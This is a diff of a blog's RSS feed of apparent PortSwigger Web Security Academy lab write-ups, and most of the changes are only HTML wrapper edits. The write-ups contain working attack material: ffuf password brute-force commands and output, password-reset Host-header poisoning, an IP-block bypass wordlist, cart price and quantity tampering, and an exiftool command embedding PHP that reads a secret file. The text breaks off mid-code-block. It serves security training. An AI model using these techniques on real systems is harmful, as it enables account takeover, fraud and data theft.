@@ -5,7 +5,7 @@
     <description>Recent content in PortSwigger Web Security Academy on zetsu</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Sun, 18 Aug 2024 22:53:20 -0300</lastBuildDate>
+    <lastBuildDate>Tue, 27 Aug 2024 22:53:20 -0300</lastBuildDate>
     
 	  <atom:link href="http://localhost:1313/book/portswigger/index.xml" rel="self" type="application/rss+xml" />
     
@@ -148,7 +148,6 @@
 &lt;h3&gt;Brute-forcing user’s password&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;brute-forcing-users-password&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#brute-forcing-users-password&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;By having previous knowledge of a username and a list of possible passwords, an attacker could be able to guess the correct password with brute-force scripts. In the following example, ffuf is used in order to perform the attack and get information about the responses for each password in the provided wordlist.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ffuf -u https://0abe006d04dc5ca680dcdab900bd0038.web-security-academy.net/login 
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;username=as&amp;amp;password=FUZZ&amp;#34;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type: application/x-www-form-urlencoded&amp;#34;&lt;/span&gt; 
@@ -161,13 +160,10 @@
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;
         /&amp;#39;___\  /&amp;#39;___\           /&amp;#39;___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
@@ -221,7 +217,7 @@ monitoring              [Status: 200, Size: 3232, Words: 1320, Lines: 65]
 montana                 [Status: 200, Size: 3231, Words: 1320, Lines: 65]
 moscow                  [Status: 200, Size: 3250, Words: 1329, Lines: 66]
 moon                    [Status: 200, Size: 3232, Words: 1320, Lines: 65]
-:: Progress: [100/100] :: Job [1/1] :: 100 req/sec :: Duration: [0:00:01] :: Errors: 0 ::&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+:: Progress: [100/100] :: Job [1/1] :: 100 req/sec :: Duration: [0:00:01] :: Errors: 0 ::&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -230,12 +226,9 @@ moon                    [Status: 200, Size: 3232, Words: 1320, Lines: 65]
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;Then we can see that most of the attempts returned the status code &lt;code&gt;200&lt;/code&gt; and try running the command again, filtering the results by the status code, leaving us with the only attempt that returned a different one:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ffuf -u https://0abe006d04dc5ca680dcdab900bd0038.web-security-academy.net/login --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;username=as&amp;amp;password=FUZZ&amp;#34;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type: application/x-www-form-urlencoded&amp;#34;&lt;/span&gt; -X POST -x http://127.0.0.1:8080 -w ~/tools/wordlists/burp/password.txt -mc all -fc &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -246,13 +239,10 @@ moon                    [Status: 200, Size: 3232, Words: 1320, Lines: 65]
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;        /&amp;#39;___\  /&amp;#39;___\           /&amp;#39;___\       
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;        /&amp;#39;___\  /&amp;#39;___\           /&amp;#39;___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
@@ -277,7 +267,7 @@ ________________________________________________
 ________________________________________________
 
 2000                    [Status: 302, Size: 0, Words: 1, Lines: 1]
-:: Progress: [100/100] :: Job [1/1] :: 100 req/sec :: Duration: [0:00:01] :: Errors: 0 ::&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+:: Progress: [100/100] :: Job [1/1] :: 100 req/sec :: Duration: [0:00:01] :: Errors: 0 ::&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -286,8 +276,6 @@ ________________________________________________
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;hr&gt;
 &lt;h3&gt;Exploiting flawed logic in password reset&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;exploiting-flawed-logic-in-password-reset&#34;&gt;&lt;/span&gt;
@@ -319,10 +307,9 @@ ________________________________________________
 &lt;p&gt;&lt;img src=&#34;image-6.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;This is the password reset link sent by e-mail when submitting the password reset form, containing either the user’s username or e-mail.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;GET /forgot-password?temp-forgot-password-token=e7e5umk9suti5r2ddxfnybd78hnhk8pk HTTP/2
-Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;GET /forgot-password?temp-forgot-password-token=e7e5umk9suti5r2ddxfnybd78hnhk8pk HTTP/2
+Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -331,8 +318,6 @@ Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;When clicking the link, this request is generated. It contains a token unique to the user. If we are able to modify the Host header for this request, we can set it to point to a server under our control.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;image-7.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
@@ -363,16 +348,15 @@ Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;
     &lt;a href=&#34;#bypassing-ip-block-with-valid-credentials&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;In some cases, the application might reset the counting of failed attempts if the attacker enter valid credentials, regardless the account. This way, an attacker might be able to bypass IP block by logging into their own account after every few attempts, allowing them to continue the attack.&lt;/p&gt;
 &lt;p&gt;In case the number of wrong attempts that triggers the IP blocker is three, the attacker’s wordlists could look like this:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;Username wordlist:
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;Username wordlist:
 1 &amp;lt;username1&amp;gt;
 2 &amp;lt;username2&amp;gt;
 3 &amp;lt;valid-username&amp;gt;
 4 &amp;lt;username3&amp;gt;
 5 &amp;lt;username4&amp;gt;
 6 &amp;lt;valid-username&amp;gt;
-7 ...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+7 ...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -381,20 +365,17 @@ Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;Password wordlist:
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;Password wordlist:
 1 &amp;lt;password1&amp;gt;
 2 &amp;lt;password2&amp;gt;
 3 &amp;lt;valid-password&amp;gt;
 4 &amp;lt;password3&amp;gt;
 5 &amp;lt;password4&amp;gt;
 6 &amp;lt;valid-password&amp;gt;
-7 ...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+7 ...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -403,8 +384,6 @@ Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;h3&gt;Rate limiting&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;rate-limiting&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#rate-limiting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;User rate limiting consists on the web application limiting the amount of requests a user can make on a specific range of time.&lt;/p&gt;
@@ -454,7 +433,6 @@ Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;
     &lt;a href=&#34;#excessive-trust-in-client-side-controls&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The following shopping application checks for the product’s value based on information included in the client side of the application, allowing attackers to craft and edit requests before they are sent do the server, and consequently purchasing products with arbitrary prices.&lt;/p&gt;
 &lt;p&gt;Original add to cart request:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /cart &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0aee00ab0420f09280afcb6f00450037.web-security-academy.net&lt;/span&gt;
@@ -479,12 +457,9 @@ Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;Edited request with product’s price set to $00.01&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /cart &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0aee00ab0420f09280afcb6f00450037.web-security-academy.net&lt;/span&gt;
@@ -509,8 +484,6 @@ Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;image-1.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
@@ -519,7 +492,6 @@ Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;
 &lt;h3&gt;High-level logic vulnerability&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;high-level-logic-vulnerability&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#high-level-logic-vulnerability&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The shopping application below performs the following POST request when a user removes an item from their cart:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /cart &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0ade003a0376404b8243e26b006f00e3.web-security-academy.net&lt;/span&gt;
@@ -551,13 +523,10 @@ Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;It follows the same logic from the request used to add one item to the user’s cart, but with a negative value, subtracting the item.&lt;/p&gt;
 &lt;p&gt;This may seem okay, as the button that removes the item from the cart is not present when the cart is empty, but this doesn’t stop the client to send that same request again, but with the empty cart, resulting in the application to ad &lt;code&gt;-x&lt;/code&gt; items to the user, and consequently, also a negative value relative to the amount of items added.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /cart &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0ade003a0376404b8243e26b006f00e3.web-security-academy.net&lt;/span&gt;
@@ -582,12 +551,9 @@ Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;However, it does check the value of the cart before checkout, so we still don’t get infinite money. We can instead add an item with a high value that covers the negative we now have on the cart, allowing us to purchase that new item for an extremely lower price.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /cart &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0ade003a0376404b8243e26b006f00e3.web-security-academy.net&lt;/span&gt;
@@ -612,8 +578,6 @@ Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-2.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;hr&gt;
@@ -646,9 +610,8 @@ Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;
 &lt;p&gt;However, it strips the user&amp;rsquo;s e-mail to 255 characters after signing up&lt;/p&gt;
 &lt;p&gt;It strips the user’s e-mail to 255 characters after registering though, which allows the attacker who can create subdomains in their e-mail client to craft such payload:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;username=banana&amp;amp;email=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaa%40dontwannacry.com.exploit-0a3300950473acc2813a062c01030059.exploit-server.net&amp;amp;password=banana&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;username=banana&amp;amp;email=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaa%40dontwannacry.com.exploit-0a3300950473acc2813a062c01030059.exploit-server.net&amp;amp;password=banana&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -657,8 +620,6 @@ Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;The e-mail’s length reaches 255 characters before the actual e-mail domain starts, so after checking for the user’s e-mail, it will grant the high privileges to the user.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;image-9.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
@@ -769,11 +730,10 @@ Executed the code&lt;/p&gt;
 &lt;h3&gt;Bypassing content checking&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;bypassing-content-checking&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#bypassing-content-checking&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;A more effective way of preventing against malicious files is to try checking a file’s content for attributes inherent to images. In this case, an attacker could still try to insert malicious code within an image’s metadata using a tool such as ExifTool.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;exiftool -Comment=&amp;#34;&amp;lt;?php echo &amp;#39;START &amp;#39; .file_get_contents(&amp;#39;/home/carlos/secret&amp;#39;) . &amp;#39; END&amp;#39;; ?&amp;gt;&amp;#34; &amp;lt;YOUR-INPUT-IMAGE&amp;gt;.jpg -o polyglot.php
